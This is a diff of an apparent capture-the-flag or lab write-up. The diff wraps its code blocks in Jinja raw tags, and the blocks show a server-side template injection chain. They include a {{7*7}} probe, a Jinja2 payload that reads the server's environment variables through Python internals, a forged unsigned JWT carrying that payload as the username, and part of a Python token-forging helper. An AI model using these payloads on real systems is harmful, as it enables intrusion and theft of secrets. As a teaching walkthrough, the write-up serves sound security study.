@@ -105,9 +105,11 @@ To test whether the username was being evaluated by the server-side template eng
 
 Initial test payload:
 
+{% raw %}
 ```jinja2
 {{7*7}}
 ```
+{% endraw %}
 
 If the account page returned:
 
@@ -119,12 +121,15 @@ that confirmed Server-Side Template Injection.
 
 After confirming template evaluation, the payload was upgraded to read environment variables:
 
+{% raw %}
 ```jinja2
 {{self.__init__.__globals__.__builtins__.__import__('os').environ}}
 ```
+{% endraw %}
 
 The forged JWT payload became:
 
+{% raw %}
 ```json
 {
   "username": "{{self.__init__.__globals__.__builtins__.__import__('os').environ}}",
@@ -133,11 +138,13 @@ The forged JWT payload became:
   "exp": 1781173589
 }
 ```
+{% endraw %}
 
 ## Forging the Token
 
 A simple Python helper can generate the unsigned JWT:
 
+{% raw %}
 ```python
 import base64
 import json
@@ -157,6 +164,8 @@ payload = {
     "iat": int(time.time()),
     "exp": int(time.time()) + 3600
 }
+```
+{% endraw %}
 
 token = (
     b64url(json.dumps(header, separators=(",", ":")).encode())
